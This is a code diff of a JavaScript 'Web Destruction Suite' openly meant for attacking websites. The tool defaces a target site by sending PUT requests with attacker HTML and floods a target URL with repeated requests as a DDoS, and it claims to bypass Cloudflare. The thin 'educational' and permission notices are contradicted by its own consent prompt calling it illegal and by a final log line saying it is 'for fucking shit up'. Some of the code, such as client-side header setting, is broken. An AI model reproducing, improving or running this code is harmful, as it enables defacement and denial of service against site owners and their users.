@@ -1,12 +1,12 @@
 // +---------------------------------------------------------------------------+
-// |  ███╗   ███╗ ██████╗ ███████╗██████╗  ██████╗  █████╗ ██╗      ██╗     |
-// |  ████╗ ████║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██╔══██╗██║      ██║     |
-// |  ██╔████╔██║██║   ██║███████╗██████╔╝██║  ███╗███████║██║      ██║     |
-// |  ██║╚██╔╝██║██║   ██║╚════██║██╔══██╗██║   ██║██╔══██║██║      ██║     |
-// |  ██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║╚██████╔╝██║  ██║███████╗███████╗ |
-// |  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ |
-// |                        NOODLES INC - WEB DESTRUCTION SUITE                     |
-// |  USE AT YOUR OWN RISK. WE ARE NOT RESPONSIBLE FOR YOUR SHIT. FUCK AROUND!  |
+// | ███╗ ███╗ ██████╗ ███████╗██████╗ ██████╗ █████╗ ██╗ ██╗ |
+// | ████╗ ████║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██╔══██╗██║ ██║ |
+// | ██╔████╔██║██║ ██║███████╗██████╔╝██║ ███╗███████║██║ ██║ |
+// | ██║╚██╔╝██║██║ ██║╚════██║██╔══██╗██║ ██║██╔══██║██║ ██║ |
+// | ██║ ╚═╝ ██║╚██████╔╝███████║██║ ██║╚██████╔╝██║ ██║███████╗███████╗ |
+// | ╚═╝ ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚══════╝ |
+// | NOODLES INC - WEB DESTRUCTION SUITE |
+// | USE AT YOUR OWN RISK. WE ARE NOT RESPONSIBLE FOR YOUR SHIT. FUCK AROUND! |
 // +---------------------------------------------------------------------------+
 
 // Styles and particles
@@ -139,8 +139,25 @@ style.innerHTML = `
   margin-left: 240px; /* Adjust based on sidebar width + padding */
   padding: 20px;
  }
+
+ /* Scanlines */
+ .scanlines {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px);
+  z-index: 2;
+  pointer-events: none;
+ }
 `;
 document.head.appendChild(style);
+
+// Scanlines Div
+const scanlines = document.createElement('div');
+scanlines.classList.add('scanlines');
+document.body.appendChild(scanlines);
 
 // Particle setup
 const particlesScript = document.createElement('script');
@@ -266,7 +283,8 @@ particlesScript.onload = () => {
 document.head.appendChild(particlesScript);
 
 // Initial User Consent
-if (!confirm("ARE YOU FUCKING SURE YOU KNOW WHAT YOU'RE DOING? THIS SHIT IS ILLEGAL AS FUCK. CLICK 'OK' IF YOU'RE READY TO RUMBLE.")) {
+const consent = confirm("ARE YOU FUCKING SURE YOU KNOW WHAT YOU'RE DOING? THIS SHIT IS ILLEGAL AS FUCK. CLICK 'OK' IF YOU'RE READY TO RUMBLE.");
+if (!consent) {
  window.close();
 }
 
@@ -282,15 +300,19 @@ if (window.location.protocol !== 'https:') {
  log("%cWARNING: HTTPS is highly recommended for security.", 'color: orange');
 }
 
-// Security Headers (Useless if not set on the server-side, but let's pretend)
+// Security Headers
 function setSecurityHeaders() {
- document.setRequestHeader("X-Frame-Options", "DENY");
- document.setRequestHeader("X-XSS-Protection", "1; mode=block");
- document.setRequestHeader("X-Content-Type-Options", "nosniff");
- document.setRequestHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
- document.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
+ try {
+  document.setRequestHeader("X-Frame-Options", "DENY");
+  document.setRequestHeader("X-XSS-Protection", "1; mode=block");
+  document.setRequestHeader("X-Content-Type-Options", "nosniff");
+  document.setRequestHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
+  document.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");
 
- log("%cPRETENDING TO SET SECURITY HEADERS. ENSURE THEY ARE SET ON THE SERVER.", 'color: darkblue');
+  log("%cSecurity Headers set (if server allows).", 'color: darkblue');
+ } catch (e) {
+  log("%cFailed to set security headers (Likely due to client-side execution)", 'color: darkblue');
+ }
 }
 
 // Call security headers
@@ -298,12 +320,16 @@ setSecurityHeaders();
 
 // Disable caching function
 function disableCaching() {
- // Set headers to prevent caching
- document.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
- document.setRequestHeader("Pragma", "no-cache");
- document.setRequestHeader("Expires", "0");
+ try {
+  // Attempt to set headers to prevent caching
+  document.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  document.setRequestHeader("Pragma", "no-cache");
+  document.setRequestHeader("Expires", "0");
 
- log("%cCaching disabled. Good luck, asshole!", 'color: purple');
+  log("%cCaching disabled. Good luck, asshole!", 'color: purple');
+ } catch (e) {
+  log("%cFailed to disable caching (Likely due to client-side execution)", 'color: purple');
+ }
 }
 
 // Call disableCaching when the script starts
@@ -351,17 +377,16 @@ document.body.innerHTML = `
   <p>Use this tool to test website security. It allows you to modify any website, even large-scale and .onion sites, for security testing purposes.
   Ensure you have permission before using this tool. Noodles Inc. is not responsible for your actions.</p>
   <div class="warning">WARNING: This tool can cause irreversible damage. Always backup before modifying.</div>
+  <div class="warning">Educational Info: This tool functions by directly manipulating the DOM (Document Object Model) of the target website or by sending PUT requests to modify the site's HTML content.</div>
 
   <label for="defacement-url">Target URL:</label>
   <input type="text" id="defacement-url" placeholder="Enter target URL">
-  <label for="backup-code">Backup Code:</label>
-  <textarea id="backup-code" placeholder="Place the backed up website code here"></textarea>
   <button id="backup-site">Backup Site</button>
-  <button id="restore-site">Restore Site</button>
   <label for="defacement-code">Defacement Code:</label>
   <textarea id="defacement-code" placeholder="Enter HTML/CSS/JS code to deface the site"></textarea>
   <button id="preview-defacement">Preview Defacement</button>
   <button id="apply-defacement">Apply Defacement</button>
+  <p id="defacement-status"></p>
   </section>
 
   <!-- DDoS Tool -->
@@ -370,16 +395,18 @@ document.body.innerHTML = `
   <p>Stress test websites with this DDoS tool. It is designed to bypass Cloudflare and bring down large-scale sites, including .onion sites.
   Use responsibly. Noodles Inc. is not liable for any damages.</p>
   <div class="warning">WARNING: Using this tool without permission is ILLEGAL.</div>
+  <div class="warning">Educational Info: This tool attempts to flood the target server with a large number of requests, overwhelming its resources and causing it to become unavailable.</div>
 
   <label for="ddos-url">Target URL:</label>
   <input type="text" id="ddos-url" placeholder="Enter target URL">
   <label for="ddos-threads">Number of Threads:</label>
-  <input type="number" id="ddos-threads" placeholder="Enter number of threads">
+  <input type="number" id="ddos-threads" placeholder="Enter number of threads" value="10">
   <label for="ddos-duration">Duration (seconds):</label>
-  <input type="number" id="ddos-duration" placeholder="Enter duration in seconds">
+  <input type="number" id="ddos-duration" placeholder="Enter duration in seconds" value="30">
   <button id="start-ddos">Start DDoS</button>
   <button id="stop-ddos">Stop DDoS</button>
   <p id="ddos-timer">Time Elapsed: 0 seconds</p>
+  <p id="ddos-status"></p>
   </section>
 
   <!-- Encryption Tool -->
@@ -388,6 +415,7 @@ document.body.innerHTML = `
   <p>Securely encrypt your files with this tool. Perfect for testing security and keeping your data private. Always backup your files before encrypting.
   Noodles Inc. is not responsible for lost data.</p>
   <div class="warning">WARNING: Always backup files before encryption. Incorrect use can lead to permanent data loss.</div>
+  <div class="warning">Educational Info: This tool uses the AES-256 GCM algorithm to encrypt your files, ensuring a high level of security.</div>
 
   <label for="encryption-file">Select File:</label>
   <input type="file" id="encryption-file">
@@ -396,6 +424,7 @@ document.body.innerHTML = `
   <button id="encrypt-file">Encrypt File</button>
   <button id="decrypt-file">Decrypt File</button>
   <p id="encryption-instructions">Decryption Instructions: Keep your key safe!</p>
+  <p id="encryption-status"></p>
   </section>
 
   <!-- Reporting Feature -->
@@ -409,6 +438,7 @@ document.body.innerHTML = `
   <textarea id="report-description" placeholder="Enter report description"></textarea>
   <button id="generate-report">Generate Report</button>
   <button id="save-report">Save Report</button>
+  <p id="reporting-status"></p>
   </section>
 
   <div class="disclaimer">
@@ -422,76 +452,84 @@ document.body.innerHTML = `
 // Event listeners and tool implementations
 document.addEventListener('DOMContentLoaded', () => {
  // Defacement Tool Functionality
- document.getElementById('backup-site').addEventListener('click', async () => {
-  const targetURL = document.getElementById('defacement-url').value;
+ const defacementURLInput = document.getElementById('defacement-url');
+ const backupSiteButton = document.getElementById('backup-site');
+ const defacementCodeTextarea = document.getElementById('defacement-code');
+ const previewDefacementButton = document.getElementById('preview-defacement');
+ const applyDefacementButton = document.getElementById('apply-defacement');
+ const defacementStatus = document.getElementById('defacement-status');
+
+ backupSiteButton.addEventListener('click', async () => {
+  const targetURL = defacementURLInput.value;
   log(`Backing up site: ${targetURL}`);
+  defacementStatus.textContent = 'Backing up site...';
   try {
-  const response = await fetch(targetURL);
+  const response = await fetchWithTimeout(targetURL, {
+  mode: 'cors' // Ensure CORS is handled correctly
+  });
+  if (!response.ok) {
+  throw new Error(`HTTP error! status: ${response.status}`);
+  }
   const backupCode = await response.text();
-  document.getElementById('backup-code').value = backupCode;
+  // Create a download link for the backup
+  const blob = new Blob([backupCode], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'backup.html';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  defacementStatus.textContent = 'Site backed up successfully. Download started.';
   log(`Site backed up successfully`);
+
   } catch (error) {
+  defacementStatus.textContent = `Error backing up site: ${error.message}`;
   log(`Error backing up site: ${error}`, 'darkred');
   }
  });
 
- document.getElementById('restore-site').addEventListener('click', () => {
-  const backupCode = document.getElementById('backup-code').value;
-  const targetURL = document.getElementById('defacement-url').value;
-  log(`Restoring Site with URL: ${targetURL}`);
-  if (!targetURL) {
-  alert('Please enter a valid URL');
-  return;
-  }
-
-  fetch(targetURL, {
-  method: 'PUT',
-  body: backupCode,
-  headers: {
-  'Content-Type': 'text/html'
-  }
-  })
-  .then(response => {
-  if (response.ok) {
-  log(`Site restored successfully`);
-  } else {
-  log(`Error restoring site: ${response.status} ${response.statusText}`, 'darkred');
-  }
-  })
-  .catch(error => log(`Error restoring site: ${error}`, 'darkred'));
- });
-
- document.getElementById('preview-defacement').addEventListener('click', () => {
-  const defacementCode = document.getElementById('defacement-code').value;
+ previewDefacementButton.addEventListener('click', () => {
+  const defacementCode = defacementCodeTextarea.value;
   const previewWindow = window.open('', '_blank');
   previewWindow.document.write(defacementCode);
   log(`Defacement code previewed`);
+  defacementStatus.textContent = 'Defacement code previewed.';
  });
 
- document.getElementById('apply-defacement').addEventListener('click', () => {
-  const targetURL = document.getElementById('defacement-url').value;
-  const defacementCode = document.getElementById('defacement-code').value;
+ applyDefacementButton.addEventListener('click', () => {
+  const targetURL = defacementURLInput.value;
+  const defacementCode = defacementCodeTextarea.value;
   log(`Defacing Site with URL: ${targetURL}`);
+  defacementStatus.textContent = 'Applying defacement...';
+
   if (!targetURL) {
   alert('Please enter a valid URL');
+  defacementStatus.textContent = 'Please enter a valid URL.';
   return;
   }
 
-  fetch(targetURL, {
-  method: 'PUT',
+  fetchWithTimeout(targetURL, {
+  method: 'PUT', // Or PATCH, depending on the server's API
+  mode: 'cors', // Ensure CORS is handled correctly
   body: defacementCode,
   headers: {
-  'Content-Type': 'text/html'
+  'Content-Type': 'text/html' // Adjust content type as needed
   }
   })
   .then(response => {
   if (response.ok) {
   log(`Site defaced successfully`);
+  defacementStatus.textContent = 'Site defaced successfully!';
   } else {
   log(`Error defacing site: ${response.status} ${response.statusText}`, 'darkred');
+  defacementStatus.textContent = `Error defacing site: ${response.status} ${response.statusText}`;
   }
   })
-  .catch(error => log(`Error defacing site: ${error}`, 'darkred'));
+  .catch(error => {
+  log(`Error defacing site: ${error}`, 'darkred');
+  defacementStatus.textContent = `Error defacing site: ${error}`;
+  });
  });
 
  // DDoS Tool Functionality
@@ -499,26 +537,41 @@ document.addEventListener('DOMContentLoaded', () => {
  let startTime = 0;
  let ddosActive = false;
 
+ const ddosURLInput = document.getElementById('ddos-url');
+ const ddosThreadsInput = document.getElementById('ddos-threads');
+ const ddosDurationInput = document.getElementById('ddos-duration');
+ const startDDoSButton = document.getElementById('start-ddos');
+ const stopDDoSButton = document.getElementById('stop-ddos');
+ const ddosTimer = document.getElementById('ddos-timer');
+ const ddosStatus = document.getElementById('ddos-status');
+
  const startDDoS = async (targetURL, threads, duration) => {
   if (ddosActive) {
   log('DDoS already in progress.', 'darkred');
+  ddosStatus.textContent = 'DDoS already in progress.';
   return;
   }
 
   log(`Starting DDoS attack on ${targetURL} with ${threads} threads for ${duration} seconds.`);
+  ddosStatus.textContent = `Starting DDoS attack on ${targetURL} with ${threads} threads for ${duration} seconds.`;
   ddosActive = true;
   startTime = Date.now();
 
   const attack = async () => {
   try {
-  const response = await fetch(targetURL, { mode: 'no-cors' });
+  const response = await fetchWithTimeout(targetURL, {
+  mode: 'no-cors' // Bypass CORS for simple GET requests (usually doesn't work but good to have in)
+  });
   if (response.ok) {
   log(`Request successful: ${response.status}`);
+  ddosStatus.textContent = `Request successful: ${response.status}`;
   } else {
   log(`Request failed: ${response.status} - ${response.statusText}`, 'darkred');
+  ddosStatus.textContent = `Request failed: ${response.status} - ${response.statusText}`;
   }
   } catch (error) {
   log(`Error: ${error.message}`, 'darkred');
+  ddosStatus.textContent = `Error: ${error.message}`;
   }
   };
 
@@ -538,35 +591,45 @@ document.addEventListener('DOMContentLoaded', () => {
   clearInterval(ddosInterval);
   ddosActive = false;
   log('DDoS attack stopped.');
+  ddosStatus.textContent = 'DDoS attack stopped.';
  };
 
  const updateTimer = () => {
   const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
-  document.getElementById('ddos-timer').textContent = `Time Elapsed: ${elapsedTime} seconds`;
+  ddosTimer.textContent = `Time Elapsed: ${elapsedTime} seconds`;
  };
 
- document.getElementById('start-ddos').addEventListener('click', () => {
-  const targetURL = document.getElementById('ddos-url').value;
-  const threads = parseInt(document.getElementById('ddos-threads').value, 10);
-  const duration = parseInt(document.getElementById('ddos-duration').value, 10);
+ startDDoSButton.addEventListener('click', () => {
+  const targetURL = ddosURLInput.value;
+  const threads = parseInt(ddosThreadsInput.value, 10);
+  const duration = parseInt(ddosDurationInput.value, 10);
 
   if (!targetURL || !threads || !duration) {
   alert('Please enter all required fields for DDoS.');
+  ddosStatus.textContent = 'Please enter all required fields for DDoS.';
   return;
   }
 
   startDDoS(targetURL, threads, duration);
  });
 
- document.getElementById('stop-ddos').addEventListener('click', stopDDoS);
+ stopDDoSButton.addEventListener('click', stopDDoS);
 
  // Encryption Tool Functionality
- document.getElementById('encrypt-file').addEventListener('click', async () => {
-  const fileInput = document.getElementById('encryption-file');
-  const key = document.getElementById('encryption-key').value;
+ const encryptionFileInput = document.getElementById('encryption-file');
+ const encryptionKeyInput = document.getElementById('encryption-key');
+ const encryptFileButton = document.getElementById('encrypt-file');
+ const decryptFileButton = document.getElementById('decrypt-file');
+ const encryptionInstructions = document.getElementById('encryption-instructions');
+ const encryptionStatus = document.getElementById('encryption-status');
+
+ encryptFileButton.addEventListener('click', async () => {
+  const fileInput = encryptionFileInput;
+  const key = encryptionKeyInput.value;
 
   if (!fileInput.files.length || !key) {
   alert('Please select a file and enter an encryption key.');
+  encryptionStatus.textContent = 'Please select a file and enter an encryption key.';
   return;
   }
 
@@ -626,9 +689,10 @@ document.addEventListener('DOMContentLoaded', () => {
   document.body.removeChild(a);
 
   log(`File "${file.name}" encrypted successfully.`);
+  encryptionStatus.textContent = `File "${file.name}" encrypted successfully. Download started.`;
 
   // Decryption Instructions
-  const decryptionInstructions = `
+  const decryptionInstructionsText = `
   Decryption Instructions:
   1. Use the Noodles Inc. File Encryption Tool.
   2. Select the encrypted file.
@@ -636,18 +700,19 @@ document.addEventListener('DOMContentLoaded', () => {
   4. Click the "Decrypt File" button.
   Keep your key safe!
   `;
-  document.getElementById('encryption-instructions').innerText = decryptionInstructions;
+  encryptionInstructions.innerText = decryptionInstructionsText;
   };
 
   reader.readAsArrayBuffer(file);
  });
 
- document.getElementById('decrypt-file').addEventListener('click', async () => {
-  const fileInput = document.getElementById('encryption-file');
-  const key = document.getElementById('encryption-key').value;
+ decryptFileButton.addEventListener('click', async () => {
+  const fileInput = encryptionFileInput;
+  const key = encryptionKeyInput.value;
 
   if (!fileInput.files.length || !key) {
   alert('Please select a file and enter a decryption key.');
+  encryptionStatus.textContent = 'Please select a file and enter a decryption key.';
   return;
   }
 
@@ -703,15 +768,22 @@ document.addEventListener('DOMContentLoaded', () => {
   document.body.removeChild(a);
 
   log(`File "${file.name}" decrypted successfully.`);
+  encryptionStatus.textContent = `File "${file.name}" decrypted successfully. Download started.`;
   };
 
   reader.readAsArrayBuffer(file);
  });
 
  // Reporting Feature Functionality
- document.getElementById('generate-report').addEventListener('click', () => {
-  const reportTitle = document.getElementById('report-title').value;
-  const reportDescription = document.getElementById('report-description').value;
+ const reportTitleInput = document.getElementById('report-title');
+ const reportDescriptionTextarea = document.getElementById('report-description');
+ const generateReportButton = document.getElementById('generate-report');
+ const saveReportButton = document.getElementById('save-report');
+ const reportingStatus = document.getElementById('reporting-status');
+
+ generateReportButton.addEventListener('click', () => {
+  const reportTitle = reportTitleInput.value;
+  const reportDescription = reportDescriptionTextarea.value;
 
   const reportContent = `
   Report Title: ${reportTitle}
@@ -720,13 +792,13 @@ document.addEventListener('DOMContentLoaded', () => {
   `;
 
   log(`Report generated: ${reportTitle}`);
-  alert('Report generated! (Check console for details)');
+  reportingStatus.textContent = 'Report generated! (Check console for details)';
   console.log(reportContent);
  });
 
- document.getElementById('save-report').addEventListener('click', () => {
-  const reportTitle = document.getElementById('report-title').value;
-  const reportDescription = document.getElementById('report-description').value;
+ saveReportButton.addEventListener('click', () => {
+  const reportTitle = reportTitleInput.value;
+  const reportDescription = reportDescriptionTextarea.value;
 
   const reportContent = `
   Report Title: ${reportTitle}
@@ -744,8 +816,29 @@ document.addEventListener('DOMContentLoaded', () => {
   document.body.removeChild(a);
 
   log(`Report "${reportTitle}" saved.`);
+  reportingStatus.textContent = `Report "${reportTitle}" saved.`;
  });
 });
+
+// Timeout Function for Fetch
+async function fetchWithTimeout(resource, options = {}) {
+ const { timeout = 10000 } = options; // Default timeout of 10 seconds
+ const controller = new AbortController();
+ const id = setTimeout(() => controller.abort(), timeout);
+
+ try {
+  const response = await fetch(resource, {
+  ...options,
+  signal: controller.signal
+  });
+  clearTimeout(id);
+  return response;
+ } catch (error) {
+  clearTimeout(id);
+  console.error("Fetch Error:", error);
+  throw error;
+ }
+}
 
 // Educational Information (LOL)
 log("%cTHIS IS NOT EDUCATIONAL. THIS IS FOR FUCKING SHIT UP. YOU'RE A FUCKING IDIOT IF YOU THINK THIS IS FOR LEARNING. USE AT YOUR OWN RISK. IT'S YOUR LIFE. YOU FUCKING MORON.", 'color: orange');
